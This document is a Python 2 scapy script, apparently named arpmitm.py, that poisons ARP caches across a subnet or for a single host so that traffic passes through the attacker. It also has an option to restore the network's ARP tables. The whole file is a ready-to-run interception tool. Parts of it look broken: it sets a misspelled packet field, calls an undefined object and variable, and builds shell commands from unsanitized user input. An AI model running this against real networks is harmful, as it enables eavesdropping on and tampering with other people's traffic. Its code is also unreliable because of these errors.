#!/usr/bin/python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
    

def main():
   #Checks for sane arguments
   if len(sys.argv) < 2:
     print "Invalid Arguments"
     print "ARP-MITM Error - Invalid Arguments were entered."
     os.system("python arpmitm.py -h")
     exit()

   #Help menu
   elif sys.argv[1] == "-h" or sys.argv[1] == "--help":
     print "\nARPMITM courtesy of r00t0v3rr1d3 & 0sm0s1z\n"
     print "Usage: python arpmitm.py [OPTIONS] gateway arprate\n"
     print "HELP MENU:"
     print "   -s,--single [target ip]	only poision a single host"
     print "   -r,--rearp			Properly rearp network"
     print "   -h,--help 			display this message"

   elif sys.argv[1] == "-r" or sys.argv[1] == "--rearp":
     print 'Re-arping the network, removing man-in-the-middle...\n'
     rearp(sys.argv[2])

   elif sys.argv[1] == "-s" or sys.argv[1] == "--single":
    print 'Poisoning a single host: ' + sys.argv[2] + '...\n'
    try:
       poisonsingle(sys.argv[2], sys.argv[3], int(sys.argv[4]))
    except:
       print "Could not poison single target: no target found!"

   elif len(sys.argv) < 4:
     print "Poisoning the entire subnet...\n"
     poisonall(sys.argv[1], int(sys.argv[2]))

def poisonall(gateway, arprate):
   #Get GW MAC ADDR
   os.system('ping -c 1 ' + gateway + ' 1 > /dev/null 2 > /dev/null')
   a = os.popen('arp ' + gateway)
   result = a.read()

   try:
     #Parse out GW MAC ADDR
     mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result).groups()[0]

     #Statically configure GW MAC to preserve local connectivity (Don't poisonself)
     os.system("arp -s " + gateway + " " + mac)
     time.sleep(.5)

     #Build Poison Packet
     packet = ARP()
     packet.op = 2
     packet.psrc = gateway
     packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
     temp2 = gateway.rpartition(".")
     random = temp2[0]

     #Could flag some rogue system detection systems
     random = random + ".37"
     packet.pdst = random
     time.sleep(.5)

     while 1:
         send(packet, verbose=0)
         time.sleep(arprate)

   except:
     print 'Unable to determine gateway. Please ensure proper network connectivity.'

def poisonsingle(targetip, gatewayip, arprate):
   gatewaymac = ''
   targetmac = ''
   os.system('ping -c 1 ' + gatewayip + ' 1 > /dev/null 2 > /dev/null')
   os.system('ping -c 1 ' + targetip + ' 1 > /dev/null 2 > /dev/null')

   a = os.popen('arp ' + gatewayip)
   result = a.read()
   try:
      gatewaymac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result).groups()[0]
      os.system("arp -s " + gatewayip + " " + gatewaymac)
      setup.objects.update(routermac = gatewaymac)

   except:
      print 'Unable to determine gateway MAC. Please ensure proper network connectivity.'
      exit(0)

   b = os.popen('arp ' + targetip)
   result2 = b.read()
   try:
      targetmac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result2).groups()[0]

   except:
      print 'Unable to determine target MAC. Please ensure target IP was entered properly.'
      exit(0)

   time.sleep(.5)
   packet = ARP()
   packet.op = 2
   packet.psrc = gatewayip
   packet.hwdsk = targetmac
   packet.pdst = targetip
   time.sleep(.5)

   while 1:
      send(packet, verbose=0)
      time.sleep(arprate)

def rearp(gateway):
   packet = ARP()
   packet.op = 2

   try:
     mac = routermac
     macaddr = mac.rstrip("\n")
     packet.hwsrc = macaddr
     packet.psrc = gateway
     packet.hwdsk = 'ff:ff:ff:ff:ff:ff'
     temp2 = gateway.rpartition(".")
     random = temp2[0]
     random = random + ".37" #random ip  - required
     packet.pdst = random
     for i in range(0,5):
         send(packet, verbose=0)
         time.sleep(1)
         send(packet, verbose=0)
     print 'Network Re-ARP Complete'

   except:
     print 'An error occured. Re-ARPing the network failed.'
		
if __name__ == '__main__':
	main()
